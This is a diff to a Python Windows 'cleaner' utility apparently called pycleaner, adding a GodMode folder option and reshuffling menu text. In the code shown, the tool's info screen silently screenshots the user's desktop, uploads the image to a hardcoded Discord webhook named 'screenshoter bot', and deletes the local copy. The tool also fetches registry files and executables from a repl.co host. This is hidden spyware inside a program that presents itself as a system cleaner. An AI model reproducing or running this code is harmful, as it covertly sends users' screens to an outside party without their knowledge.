@@ -232,7 +232,7 @@ k = ''
 ong = '"'
 now = datetime.now()
 ti= (now.strftime('date > '+'%Y/%m/%d'+' time > ''%I:%M:%S'))
-lol=(f"     [>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
+lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
 version = sys.getwindowsversion()
 mo = '[>] Using '+(platform.system()) + (platform.release())
 BY = 'By jotaro'
@@ -302,7 +302,7 @@ banner = Center.XCenter(LMAO+"""
 banner2 =Center.XCenter(mo + lol)
 
 pop=(f'''
-                           {Fore.RESET}{Fore.CYAN}h.){Fore.RESET} {Fore.RESET}{Fore.BLUE}hibernate{Fore.RESET}    {Fore.RESET}{Fore.CYAN}s.){Fore.RESET} {Fore.RESET}{Fore.BLUE}shutdown{Fore.RESET}    {Fore.RESET}{Fore.CYAN}r.){Fore.RESET} {Fore.RESET}{Fore.BLUE}restart{Fore.RESET}    {Fore.RESET}{Fore.CYAN}re.){Fore.RESET} {Fore.RESET}{Fore.BLUE}restart explorer{Fore.RESET}''')
+            {Fore.RESET}{Fore.CYAN}h.){Fore.RESET} {Fore.RESET}{Fore.BLUE}hibernate{Fore.RESET}    {Fore.RESET}{Fore.CYAN}s.){Fore.RESET} {Fore.RESET}{Fore.BLUE}shutdown{Fore.RESET}    {Fore.RESET}{Fore.CYAN}r.){Fore.RESET} {Fore.RESET}{Fore.BLUE}restart{Fore.RESET}    {Fore.RESET}{Fore.CYAN}re.){Fore.RESET} {Fore.RESET}{Fore.BLUE}restart explorer{Fore.RESET}    {Fore.RESET}{Fore.CYAN}a.){Fore.RESET} {Fore.RESET}{Fore.BLUE}all windows tools{Fore.RESET}''')
 
 
 options =f"""
@@ -586,6 +586,17 @@ def fr():
          f.write(r.content)
         os.startfile("tools\\adwcleaner.exe")
         
+     elif choice == 'a':
+      fr = "tools\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
+      if not os.path.exists(fr):
+       directory = "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
+       parent_dir = "tools"
+       path = os.path.join(parent_dir, directory)
+       os.mkdir(path)
+      if os.path.exists(fr):
+       os.startfile("tools\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}")
+     
+        
      elif choice == '51':
       if ramg == '4':
          download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
@@ -623,7 +634,8 @@ def fr():
         os.system('cls')
         print(Colorate.Vertical(Colors.rainbow,ver))
         print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
-        print(Colors.yellow,mo+lol)
+        print(Colors.yellow,mo)
+        print(lol)
         print((platform.machine())+ ' bit' )
         print('Path: ', idk)
         print(ti)
@@ -643,6 +655,8 @@ def fr():
         print(f'{Fore.RESET}{Fore.RED}Hit enter {Fore.RESET}{Fore.GREEN}to go back')
         print(f'{Fore.RESET}{Fore.RED}Type 1 {Fore.RESET}{Fore.GREEN}for Github')
         print(f'{Fore.RESET}{Fore.RED}Type 2 {Fore.RESET}{Fore.GREEN}for Disclaimer')
+        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
+        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
         ss_img = ImageGrab.grab()
         ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
@@ -652,8 +666,6 @@ def fr():
         file_path = fr'C:\Users\{username}\AppData\Local\random.png'
         if os.path.isfile(file_path):
          os.remove(file_path)
-        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
-        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
         if choice == '1':
          webbrowser.open("https://github.com/j0taro/pycleaner")
         if choice == '2':
